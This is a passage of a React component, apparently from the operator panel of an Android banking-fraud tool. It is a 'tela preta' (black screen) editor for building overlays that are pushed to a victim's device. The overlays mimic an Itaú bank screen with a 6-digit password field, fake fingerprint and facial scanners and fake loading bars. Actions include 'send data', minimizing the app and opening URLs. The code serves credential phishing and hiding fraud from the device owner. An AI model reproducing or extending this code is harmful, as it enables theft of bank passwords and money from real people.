  const selectedEl = elements.find(el => el.id === selectedElement);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
      <div className="bg-[#290903] rounded-xl w-full max-w-6xl max-h-[95vh] overflow-hidden flex flex-col">
        {/* Header */}
        <div className="bg-[#440e05] p-4 flex items-center justify-between border-b border-blue-500/20">
          <div className="flex items-center gap-4">
            <h2 className="text-xl font-bold text-white">🎨 Editor de Tela Preta</h2>
            <input
              type="text"
              value={templateName}
              onChange={(e) => setTemplateName(e.target.value)}
              className="bg-slate-700 text-white px-3 py-1 rounded border border-blue-500/25"
              placeholder="Nome do template"
            />
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={() => setShowTemplates(!showTemplates)}
              className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-semibold"
            >
              📁 Templates
            </button>
            <button
              onClick={saveTemplate}
              className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-semibold flex items-center gap-2"
            >
              <Save className="w-4 h-4" /> Salvar
            </button>
            <button
              onClick={applyTemplate}
              className="px-4 py-2 bg-orange-600 hover:bg-orange-700 text-white rounded-lg text-sm font-semibold"
            >
              ⚡ Aplicar no Dispositivo
            </button>
            <button
              onClick={onClose}
              className="p-2 bg-red-600 hover:bg-red-700 text-white rounded-lg"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex flex-1 overflow-hidden">
          {/* Left Panel - Elements */}
          <div className="w-48 bg-[#440e05] p-3 border-r border-blue-500/20 overflow-y-auto">
            <h3 className="text-white font-semibold mb-3 text-sm">➕ Adicionar</h3>
            <div className="space-y-2">
              <button
                onClick={() => addElement('text')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-sm"
              >
                <Type className="w-4 h-4" /> Texto
              </button>
              <button
                onClick={() => addElement('logo')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-sm"
              >
                <span>🏦</span> Logo do Banco
              </button>
              <button
                onClick={() => addElement('input')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-amber-700 hover:bg-amber-600 text-white rounded text-sm"
              >
                <span>📥</span> Campo (Input)
              </button>
              <button
                onClick={() => addElement('button')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-orange-700 hover:bg-orange-600 text-white rounded text-sm"
              >
                <span>🔘</span> Botão (Confirmar)
              </button>
              <button
                onClick={() => addElement('image')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-sm"
              >
                <Image className="w-4 h-4" /> Imagem Custom
              </button>
              <button
                onClick={() => addElement('rectangle')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-sm"
              >
                <Square className="w-4 h-4" /> Retângulo
              </button>
              <button
                onClick={() => addElement('circle')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-sm"
              >
                <Circle className="w-4 h-4" /> Círculo
              </button>
              <button
                onClick={() => addElement('fingerprint')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-indigo-700 hover:bg-indigo-600 text-white rounded text-sm"
              >
                <Fingerprint className="w-4 h-4" /> Digital
              </button>
              <button
                onClick={() => addElement('facial')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-teal-700 hover:bg-teal-600 text-white rounded text-sm"
              >
                <Scan className="w-4 h-4" /> Facial
              </button>
              <button
                onClick={() => addElement('loading_bar')}
                className="w-full flex items-center gap-2 px-3 py-2 bg-pink-700 hover:bg-pink-600 text-white rounded text-sm"
              >
                <Loader2 className="w-4 h-4" /> Carregando
              </button>
            </div>

            <h3 className="text-white font-semibold mt-6 mb-3 text-sm">🎨 Fundo</h3>
            <div className="flex items-center gap-2">
              <input
                type="color"
                value={backgroundColor}
                onChange={(e) => setBackgroundColor(e.target.value)}
                className="w-10 h-10 rounded cursor-pointer"
              />
              <input
                type="text"
                value={backgroundColor}
                onChange={(e) => setBackgroundColor(e.target.value)}
                className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
              />
            </div>

            <h3 className="text-white font-semibold mt-6 mb-3 text-sm">📋 Elementos ({elements.length})</h3>
            <div className="space-y-1 max-h-48 overflow-y-auto pr-1">
              {elements.map((el, index) => (
                <div
                  key={el.id}
                  onClick={() => setSelectedElement(el.id)}
                  className={`flex items-center justify-between px-2 py-1.5 rounded cursor-pointer text-xs ${
                    selectedElement === el.id ? 'bg-blue-600 ring-1 ring-blue-400' : 'bg-slate-700 hover:bg-slate-600'
                  }`}
                >
                  <span className="text-white truncate flex-1 mr-2">
                    <span className="text-gray-400 mr-1">{index + 1}.</span>
                    {el.type === 'text' && `📝 ${el.content?.substring(0, 12) || 'Texto'}${(el.content?.length || 0) > 12 ? '...' : ''}`}
                    {el.type === 'logo' && `🏦 Logo: ${el.content?.substring(0, 12) || 'itaú'}`}
                    {el.type === 'input' && `📥 Campo: ${el.placeholder?.substring(0, 12) || 'Senha'}`}
                    {el.type === 'button' && `🔘 Botão: ${el.content?.substring(0, 12) || 'Confirmar'}`}
                    {el.type === 'image' && '🖼️ Imagem'}
                    {el.type === 'rectangle' && '⬛ Retângulo'}
                    {el.type === 'circle' && '⚫ Círculo'}
                    {el.type === 'fingerprint' && '👉 Digital'}
                    {el.type === 'facial' && '👤 Facial'}
                    {el.type === 'loading_bar' && '⏳ Barra de Progresso'}
                  </span>
                  <button
                    onClick={(e) => { e.stopPropagation(); deleteElement(el.id); }}
                    className="text-red-400 hover:text-red-300 p-0.5"
                  >
                    <Trash2 className="w-3 h-3" />
                  </button>
                </div>
              ))}
            </div>
            {elements.length === 0 && (
              <p className="text-gray-500 text-xs text-center py-4">Nenhum elemento</p>
            )}
          </div>

          {/* Center - Phone Preview */}
          <div className="flex-1 flex items-center justify-center p-4 bg-[#120303] overflow-auto">
            <div className="relative flex-shrink-0">
              {/* Phone Frame */}
              <div className="bg-gray-800 rounded-[40px] p-3 shadow-2xl">
                <div 
                  ref={previewRef}
                  className="relative rounded-[32px]"
                  style={{
                    width: `${PREVIEW_WIDTH}px`,
                    height: `${PREVIEW_HEIGHT}px`,
                    background: backgroundColor,
                    overflow: 'visible' // Permite ver elementos que saem da área
                  }}
                  onMouseMove={handleMouseMove}
                  onMouseUp={handleMouseUp}
                  onMouseLeave={handleMouseUp}
                  onClick={() => setSelectedElement(null)}
                >
                  {/* Notch */}
                  <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-6 bg-gray-800 rounded-b-2xl z-10" />
                  
                  {/* Elements */}
                  {elements.map((el, index) => {
                    const scaleX = PREVIEW_WIDTH / ANDROID_WIDTH;
                    const scaleY = PREVIEW_HEIGHT / ANDROID_HEIGHT;
                    
                    return (
                      <div
                        key={el.id}
                        className={`absolute cursor-move transition-shadow ${
                          selectedElement === el.id ? 'ring-2 ring-blue-500 z-20' : 'z-10'
                        }`}
                        style={{
                          left: el.x * scaleX,
                          top: el.y * scaleY,
                          width: Math.max(el.width * scaleX, 20),
                          height: Math.max(el.height * scaleY, 20),
                          opacity: (el.opacity || 100) / 100
                        }}
                        onMouseDown={(e) => handleMouseDown(e, el.id)}
                        title={`Elemento ${index + 1}: ${el.type} (${Math.round(el.x)}, ${Math.round(el.y)})`}
                      >
                        {el.type === 'text' && (
                          <div
                            style={{
                              color: el.color,
                              fontSize: Math.max((el.fontSize || 16) * scaleX, 8),
                              fontWeight: el.fontWeight,
                              textAlign: 'center',
                              width: '100%',
                              height: '100%',
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'center',
                              wordBreak: 'break-word',
                              overflow: 'hidden'
                            }}
                          >
                            {el.content}
                          </div>
                        )}
                        {el.type === 'logo' && (
                          <div
                            style={{
                              color: el.color || '#ffffff',
                              fontSize: Math.max((el.fontSize || 22) * scaleX, 10),
                              fontWeight: 'bold',
                              textAlign: 'center',
                              width: '100%',
                              height: '100%',
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'center',
                              textTransform: 'lowercase',
                              fontFamily: 'sans-serif'
                            }}
                          >
                            {el.content}
                          </div>
                        )}
                        {el.type === 'input' && (
                          <div
                            className="w-full h-full flex flex-col justify-center px-3 border"
                            style={{
                              backgroundColor: el.backgroundColor || 'rgba(22, 6, 6, 0.6)',
                              borderColor: el.borderColor || '#ec7000',
                              borderRadius: `${el.borderRadius !== undefined ? el.borderRadius : 12}px`,
                              color: el.color || '#ffffff',
                              fontSize: '11px'
                            }}
                          >
                            <span className="text-gray-400 select-none truncate pointer-events-none">
                              {el.placeholder || 'Senha eletrônica (6 dígitos)'}
                            </span>
                          </div>
                        )}
                        {el.type === 'button' && (
                          <div
                            className="w-full h-full flex items-center justify-center font-bold font-sans shadow-md"
                            style={{
                              backgroundColor: el.backgroundColor || '#ec7000',
                              color: el.color || '#ffffff',
                              borderRadius: `${el.borderRadius !== undefined ? el.borderRadius : 12}px`,
                              fontSize: '12px'
                            }}
                          >
                            {el.content || 'Confirmar'}
                          </div>
                        )}
                        {el.type === 'image' && (
                          <div
                            className="w-full h-full flex items-center justify-center overflow-hidden"
                            style={{ backgroundColor: el.backgroundColor || 'transparent' }}
                          >
                            {el.imageUrl ? (
                              <img src={el.imageUrl} alt="" className="max-w-full max-h-full object-contain" />
                            ) : (
                              <div className="text-gray-500 text-xs flex flex-col items-center">
                                <span className="text-2xl">📷</span>
                                <span className="text-[10px]">Clique para adicionar</span>
                              </div>
                            )}
                          </div>
                        )}
                        {(el.type === 'rectangle' || el.type === 'circle') && (
                          <div
                            className="w-full h-full"
                            style={{
                              backgroundColor: el.backgroundColor,
                              borderRadius: el.type === 'circle' ? '50%' : (el.borderRadius || 0)
                            }}
                          />
                        )}
                        {el.type === 'fingerprint' && (
                          <div className="w-full h-full flex flex-col items-center justify-center p-2 border border-dashed border-indigo-500/30 rounded bg-indigo-950/20">
                            <div 
                              className="relative flex items-center justify-center rounded-full p-4 border-2 animate-pulse"
                              style={{ 
                                borderColor: el.biometricColor || '#00ff00',
                                boxShadow: `0 0 10px ${el.biometricColor || '#00ff00'}`
                              }}
                            >
                              <Fingerprint size={32} style={{ color: el.biometricColor || '#00ff00' }} />
                            </div>
                            <span className="text-[10px] text-gray-400 mt-2 text-center truncate w-full">
                              {el.biometricText}
                            </span>
                          </div>
                        )}
                        {el.type === 'facial' && (
                          <div className="w-full h-full flex flex-col items-center justify-center p-2 border border-dashed border-teal-500/30 rounded bg-teal-950/20 overflow-hidden relative">
                            {/* Retângulo de escaneamento facial com cantoneiras neon */}
                            <div 
                              className={`relative w-2/3 h-2/3 border-2 flex items-center justify-center overflow-hidden ${el.biometricShape === 'oval' ? 'rounded-full' : 'rounded-xl'}`}
                              style={{ 
                                borderColor: el.biometricColor || '#ffbf00',
                                boxShadow: `0 0 10px ${el.biometricColor || '#ffbf00'}`
                              }}
                            >
                              {/* Linha laser que sobe e desce */}
                              <div 
                                className="absolute w-full h-[3px] left-0 animate-scan-line"
                                style={{ backgroundColor: el.biometricColor || '#ffbf00' }}
                              />
                            </div>
                            <span className="text-[10px] text-gray-400 mt-2 text-center truncate w-full">
                              {el.biometricText}
                            </span>
                          </div>
                        )}
                        {el.type === 'loading_bar' && (
                          <div className="w-full h-full flex flex-col items-center justify-center p-2 border border-dashed border-pink-500/30 rounded bg-pink-950/20">
                            <span className="text-[10px] text-gray-400 mb-1 text-center truncate w-full">
                              {el.loadingText} (50%)
                            </span>
                            <div className="w-full h-3 bg-gray-700 rounded-full overflow-hidden">
                              <div 
                                className="h-full rounded-full transition-all duration-1000"
                                style={{ 
                                  width: '50%',
                                  backgroundColor: el.backgroundColor || '#ff00ff' 
                                }}
                              />
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })}
                  
                  {/* Grid visual de ajuda (mostra quando arrasta) */}
                  {isDragging && (
                    <div className="absolute inset-0 pointer-events-none" style={{
                      backgroundImage: 'linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px)',
                      backgroundSize: '30px 30px'
                    }} />
                  )}
                </div>
              </div>
              
              {/* Info da posição atual */}
              {selectedEl && isDragging && (
                <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 bg-black/80 text-white px-2 py-1 rounded text-xs">
                  X: {Math.round(selectedEl.x)} | Y: {Math.round(selectedEl.y)}
                </div>
              )}
            </div>
          </div>

          {/* Right Panel - Properties */}
          <div className="w-64 bg-[#440e05] p-3 border-l border-blue-500/20 overflow-y-auto">
            {selectedEl ? (
              <>
                <h3 className="text-white font-semibold mb-3 text-sm">⚙️ Propriedades</h3>
                
                {/* Position */}
                <div className="mb-4">
                  <label className="text-gray-400 text-xs">Posição</label>
                  <div className="flex gap-2 mt-1">
                    <div className="flex-1">
                      <label className="text-gray-500 text-[10px]">X</label>
                      <input
                        type="number"
                        value={Math.round(selectedEl.x)}
                        onChange={(e) => updateElement(selectedEl.id, { x: parseInt(e.target.value) || 0 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm"
                      />
                    </div>
                    <div className="flex-1">
                      <label className="text-gray-500 text-[10px]">Y</label>
                      <input
                        type="number"
                        value={Math.round(selectedEl.y)}
                        onChange={(e) => updateElement(selectedEl.id, { y: parseInt(e.target.value) || 0 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm"
                      />
                    </div>
                  </div>
                </div>

                {/* Size */}
                <div className="mb-4">
                  <label className="text-gray-400 text-xs">Tamanho</label>
                  <div className="flex gap-2 mt-1">
                    <div className="flex-1">
                      <label className="text-gray-500 text-[10px]">Largura</label>
                      <input
                        type="number"
                        value={Math.round(selectedEl.width)}
                        onChange={(e) => updateElement(selectedEl.id, { width: parseInt(e.target.value) || 50 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm"
                      />
                    </div>
                    <div className="flex-1">
                      <label className="text-gray-500 text-[10px]">Altura</label>
                      <input
                        type="number"
                        value={Math.round(selectedEl.height)}
                        onChange={(e) => updateElement(selectedEl.id, { height: parseInt(e.target.value) || 50 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm"
                      />
                    </div>
                  </div>
                </div>

                {/* Text & Logo Properties */}
                {(selectedEl.type === 'text' || selectedEl.type === 'logo') && (
                  <>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Texto / Conteúdo</label>
                      <textarea
                        value={selectedEl.content || ''}
                        onChange={(e) => updateElement(selectedEl.id, { content: e.target.value })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                        rows={2}
                      />
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Tamanho da Fonte</label>
                      <input
                        type="number"
                        value={selectedEl.fontSize || 16}
                        onChange={(e) => updateElement(selectedEl.id, { fontSize: parseInt(e.target.value) || 16 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      />
                    </div>
                    {selectedEl.type === 'text' && (
                      <div className="mb-4">
                        <label className="text-gray-400 text-xs">Peso</label>
                        <select
                          value={selectedEl.fontWeight || 'normal'}
                          onChange={(e) => updateElement(selectedEl.id, { fontWeight: e.target.value })}
                          className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                        >
                          <option value="normal">Normal</option>
                          <option value="bold">Negrito</option>
                          <option value="lighter">Leve</option>
                        </select>
                      </div>
                    )}
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor do Texto</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.color || '#ffffff'}
                          onChange={(e) => updateElement(selectedEl.id, { color: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.color || '#ffffff'}
                          onChange={(e) => updateElement(selectedEl.id, { color: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                  </>
                )}

                {/* Input Properties */}
                {selectedEl.type === 'input' && (
                  <>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Placeholder do Campo</label>
                      <input
                        type="text"
                        value={selectedEl.placeholder || ''}
                        onChange={(e) => updateElement(selectedEl.id, { placeholder: e.target.value })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      />
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor da Borda</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.borderColor || '#ec7000'}
                          onChange={(e) => updateElement(selectedEl.id, { borderColor: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.borderColor || '#ec7000'}
                          onChange={(e) => updateElement(selectedEl.id, { borderColor: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor de Fundo</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.backgroundColor || '#280904'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.backgroundColor || '#280904'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Borda Arredondada (px)</label>
                      <input
                        type="number"
                        value={selectedEl.borderRadius !== undefined ? selectedEl.borderRadius : 12}
                        onChange={(e) => updateElement(selectedEl.id, { borderRadius: parseInt(e.target.value) || 0 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      />
                    </div>
                  </>
                )}

                {/* Button Properties */}
                {selectedEl.type === 'button' && (
                  <>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Texto do Botão</label>
                      <input
                        type="text"
                        value={selectedEl.content || ''}
                        onChange={(e) => updateElement(selectedEl.id, { content: e.target.value })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      />
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor do Botão</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.backgroundColor || '#ec7000'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.backgroundColor || '#ec7000'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor do Texto</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.color || '#ffffff'}
                          onChange={(e) => updateElement(selectedEl.id, { color: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.color || '#ffffff'}
                          onChange={(e) => updateElement(selectedEl.id, { color: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Borda Arredondada (px)</label>
                      <input
                        type="number"
                        value={selectedEl.borderRadius !== undefined ? selectedEl.borderRadius : 12}
                        onChange={(e) => updateElement(selectedEl.id, { borderRadius: parseInt(e.target.value) || 0 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      />
                    </div>
                  </>
                )}

                {/* Image Properties */}
                {selectedEl.type === 'image' && (
                  <div className="mb-4">
                    <label className="text-gray-400 text-xs">Imagem</label>
                    <input
                      type="file"
                      accept="image/*"
                      onChange={(e) => handleImageUpload(e, selectedEl.id)}
                      className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                    />
                    {selectedEl.imageUrl && (
                      <img src={selectedEl.imageUrl} alt="" className="mt-2 max-h-20 rounded" />
                    )}
                  </div>
                )}

                {/* Shape Properties */}
                {(selectedEl.type === 'rectangle' || selectedEl.type === 'circle') && (
                  <>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor de Fundo</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.backgroundColor || '#333333'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.backgroundColor || '#333333'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                    {selectedEl.type === 'rectangle' && (
                      <div className="mb-4">
                        <label className="text-gray-400 text-xs">Borda Arredondada</label>
                        <input
                          type="number"
                          value={selectedEl.borderRadius || 0}
                          onChange={(e) => updateElement(selectedEl.id, { borderRadius: parseInt(e.target.value) || 0 })}
                          className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                        />
                      </div>
                    )}
                  </>
                )}

                {/* Biometric Properties (Fingerprint / Facial) */}
                {(selectedEl.type === 'fingerprint' || selectedEl.type === 'facial') && (
                  <>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Texto Instrutivo</label>
                      <input
                        type="text"
                        value={selectedEl.biometricText || ''}
                        onChange={(e) => updateElement(selectedEl.id, { biometricText: e.target.value })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                        placeholder="Toque e segure..."
                      />
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor do Scanner</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.biometricColor || '#00ff00'}
                          onChange={(e) => updateElement(selectedEl.id, { biometricColor: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.biometricColor || '#00ff00'}
                          onChange={(e) => updateElement(selectedEl.id, { biometricColor: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                    {selectedEl.type === 'facial' && (
                      <div className="mb-4">
                        <label className="text-gray-400 text-xs">Formato do Scanner</label>
                        <select
                          value={selectedEl.biometricShape || 'normal'}
                          onChange={(e) => updateElement(selectedEl.id, { biometricShape: e.target.value as any })}
                          className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                        >
                          <option value="normal">⏹️ Retângulo Arredondado</option>
                          <option value="oval">🟣 Oval / Circular</option>
                        </select>
                      </div>
                    )}
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Ação após Sucesso</label>
                      <select
                        value={selectedEl.biometricAction || 'next'}
                        onChange={(e) => updateElement(selectedEl.id, { biometricAction: e.target.value as any })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      >
                        <option value="next">▶️ Próxima tela</option>
                        <option value="submit">📤 Enviar dados + Próxima</option>
                        <option value="close">❌ Fechar app (volta p/ home)</option>
                        <option value="home">🏠 Ir para Home do Android</option>
                        <option value="hide">👁️ Minimizar app</option>
                        <option value="open_url">🌐 Abrir URL no navegador</option>
                      </select>
                    </div>
                    {selectedEl.biometricAction === 'open_url' && (
                      <div className="mb-4">
                        <label className="text-gray-400 text-xs">🌐 URL para abrir</label>
                        <input
                          type="text"
                          value={selectedEl.biometricUrl || ''}
                          onChange={(e) => updateElement(selectedEl.id, { biometricUrl: e.target.value })}
                          className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                          placeholder="https://google.com"
                        />
                      </div>
                    )}
                  </>
                )}

                {/* Loading Bar Properties */}
                {selectedEl.type === 'loading_bar' && (
                  <>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Texto de Status</label>
                      <input
                        type="text"
                        value={selectedEl.loadingText || ''}
                        onChange={(e) => updateElement(selectedEl.id, { loadingText: e.target.value })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                        placeholder="Carregando..."
                      />
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Duração (ms)</label>
                      <input
                        type="number"
                        value={selectedEl.loadingDuration || 3000}
                        onChange={(e) => updateElement(selectedEl.id, { loadingDuration: parseInt(e.target.value) || 3000 })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      />
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Cor da Barra</label>
                      <div className="flex gap-2 mt-1">
                        <input
                          type="color"
                          value={selectedEl.backgroundColor || '#00ff00'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="w-10 h-8 rounded cursor-pointer"
                        />
                        <input
                          type="text"
                          value={selectedEl.backgroundColor || '#00ff00'}
                          onChange={(e) => updateElement(selectedEl.id, { backgroundColor: e.target.value })}
                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
                        />
                      </div>
                    </div>
                    <div className="mb-4">
                      <label className="text-gray-400 text-xs">Ação ao Concluir</label>
                      <select
                        value={selectedEl.loadingAction || 'next'}
                        onChange={(e) => updateElement(selectedEl.id, { loadingAction: e.target.value as any })}
                        className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                      >
                        <option value="next">▶️ Próxima tela</option>
                        <option value="submit">📤 Enviar dados + Próxima</option>
                        <option value="close">❌ Fechar app (volta p/ home)</option>
                        <option value="home">🏠 Ir para Home do Android</option>
                        <option value="hide">👁️ Minimizar app</option>
                        <option value="open_url">🌐 Abrir URL no navegador</option>
                      </select>
                    </div>
                    {selectedEl.loadingAction === 'open_url' && (
                      <div className="mb-4">
                        <label className="text-gray-400 text-xs">🌐 URL para abrir</label>
                        <input
                          type="text"
                          value={selectedEl.loadingUrl || ''}
                          onChange={(e) => updateElement(selectedEl.id, { loadingUrl: e.target.value })}
                          className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
                          placeholder="https://google.com"
                        />
                      </div>
                    )}
                  </>
                )}

                {/* Opacity */}
                <div className="mb-4">
                  <label className="text-gray-400 text-xs">Opacidade ({selectedEl.opacity || 100}%)</label>
                  <input
                    type="range"
                    min="0"
                    max="100"
                    value={selectedEl.opacity || 100}
                    onChange={(e) => updateElement(selectedEl.id, { opacity: parseInt(e.target.value) })}
                    className="w-full mt-1"
                  />
                </div>

                {/* Delete Button */}
                <button
                  onClick={() => deleteElement(selectedEl.id)}
                  className="w-full py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-semibold flex items-center justify-center gap-2"
                >
                  <Trash2 className="w-4 h-4" /> Excluir Elemento
                </button>
              </>
            ) : (
              <div className="text-gray-400 text-sm text-center py-8">
                Selecione um elemento para editar suas propriedades
              </div>
            )}
          </div>
        </div>

        {/* Templates Modal */}
        {showTemplates && (
          <div className="absolute inset-0 bg-black/80 flex items-center justify-center z-20">
            <div className="bg-[#440e05] border border-blue-500/30 rounded-xl p-6 w-[550px] max-h-[85vh] flex flex-col overflow-hidden">
              <div className="flex items-center justify-between mb-4 pb-2 border-b border-blue-500/20">
                <h3 className="text-white font-bold text-lg flex items-center gap-2">
                  <span>📁</span> Templates de Tela Preta
                </h3>
                <button onClick={() => setShowTemplates(false)} className="text-gray-400 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>
              
              <div className="overflow-y-auto flex-1 space-y-6 pr-1">
                {/* Seção 1: Templates de Fábrica */}
                <div>
                  <h4 className="text-xs font-semibold uppercase tracking-wider text-blue-400 mb-3 flex items-center gap-2">
                    <span>✨</span> Atualizações & Overlays Prontos
                  </h4>
                  <div className="space-y-2">
                    {PREDEFINED_BLACK_SCREEN_TEMPLATES.map(tpl => (
                      <div
                        key={tpl.id}
                        className="flex items-center justify-between bg-slate-800/80 border border-slate-700 p-3 rounded-lg hover:border-blue-500/50 transition-all"
                      >
                        <div className="flex-1 mr-4">
                          <p className="text-white font-medium text-sm">{tpl.name}</p>
                          <p className="text-gray-400 text-[11px] mt-0.5">
                            {tpl.elements.length} elemento(s) • Fundo: {tpl.backgroundColor}
                          </p>
                        </div>
                        <button
                          onClick={() => { loadTemplate(tpl); setShowTemplates(false); }}
                          className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-semibold transition-colors"
                        >
                          Carregar
                        </button>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Seção 2: Meus Templates */}
                <div>
                  <h4 className="text-xs font-semibold uppercase tracking-wider text-gray-400 mb-3">
                    📂 Meus Templates Customizados
                  </h4>
                  {savedTemplates.length === 0 ? (
                    <p className="text-gray-500 text-center py-6 border border-dashed border-gray-700 rounded-lg text-xs">
                      Nenhum template salvo
                    </p>
                  ) : (
                    <div className="space-y-2">
                      {savedTemplates.map(template => (
                        <div
                          key={template.id}
                          className="flex items-center justify-between bg-slate-800 p-3 rounded-lg"
                        >
                          <div className="flex-1 mr-4">
                            <p className="text-white font-semibold text-sm">{template.name}</p>
                            <p className="text-gray-400 text-[11px] mt-0.5">
                              {template.elements.length} elementos • {new Date(template.createdAt).toLocaleDateString()}
                            </p>
                          </div>
                          <div className="flex gap-2">
                            <button
                              onClick={() => { loadTemplate(template); setShowTemplates(false); }}
